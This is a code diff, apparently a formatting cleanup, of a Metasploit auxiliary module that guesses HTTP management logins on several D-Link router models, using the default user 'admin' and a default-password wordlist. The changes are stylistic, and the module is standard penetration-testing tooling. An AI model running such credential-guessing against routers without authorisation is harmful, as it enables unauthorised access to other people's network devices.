@@ -12,32 +12,33 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'D-Link DIR-300B / DIR-600B / DIR-815 / DIR-645 HTTP Login Utility',
-      'Description'    => %q{
+      'Name' => 'D-Link DIR-300B / DIR-600B / DIR-815 / DIR-645 HTTP Login Utility',
+      'Description' => %q{
           This module attempts to authenticate to different D-Link HTTP management
         services. It has been tested successfully on D-Link DIR-300 Hardware revision B,
         D-Link DIR-600 Hardware revision B, D-Link DIR-815 Hardware revision A and DIR-645
         Hardware revision A devices. It is possible that this module also works with other
         models.
       },
-      'Author'         =>
-        [
-          'hdm',	#http_login module
-          'Michael Messner <devnull[at]s3cur1ty.de>'	#dlink login included
-        ],
-      'References'     =>
-        [
-          [ 'CVE', '1999-0502'] # Weak password
-        ],
-      'License'        => MSF_LICENSE
+      'Author' => [
+        'hdm',	# http_login module
+        'Michael Messner <devnull[at]s3cur1ty.de>'	# dlink login included
+      ],
+      'References' => [
+        [ 'CVE', '1999-0502'] # Weak password
+      ],
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
-        OptString.new('USERNAME',  [ false, "Username for authentication (default: admin)","admin" ]),
-        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
-      ])
+        OptString.new('USERNAME', [ false, "Username for authentication (default: admin)", "admin" ]),
+        OptPath.new('PASS_FILE', [
+          false, "File containing passwords, one per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")
+        ]),
+      ]
+    )
 
     deregister_options('HttpUsername', 'HttpPassword')
   end
@@ -54,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
     response = send_request_cgi({
       'uri' => @uri,
       'method' => 'GET'
-      })
+    })
 
     if response and response.headers['Server'] and response.headers['Server'] =~ /Linux,\ HTTP\/1.1,\ DIR-.*Ver\ .*/
       return true
@@ -64,7 +65,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     @uri = "/session.cgi"
 
     if is_dlink?
@@ -109,10 +109,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # default to user=admin without password (default on most dlink routers)
-  def do_login(user='admin', pass='')
+  def do_login(user = 'admin', pass = '')
     vprint_status("#{target_url} - Trying username:'#{user}' with password:'#{pass}'")
 
-    response  = do_http_login(user,pass)
+    response = do_http_login(user, pass)
     result = determine_result(response)
 
     if result == :success
@@ -127,7 +127,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def do_http_login(user,pass)
+  def do_http_login(user, pass)
     begin
       response = send_request_cgi({
         'uri' => @uri,
@@ -157,6 +157,7 @@ class MetasploitModule < Msf::Auxiliary
     if response.body =~ /\<RESULT\>SUCCESS\<\/RESULT\>/
       return :success
     end
+
     return :fail
   end
 end
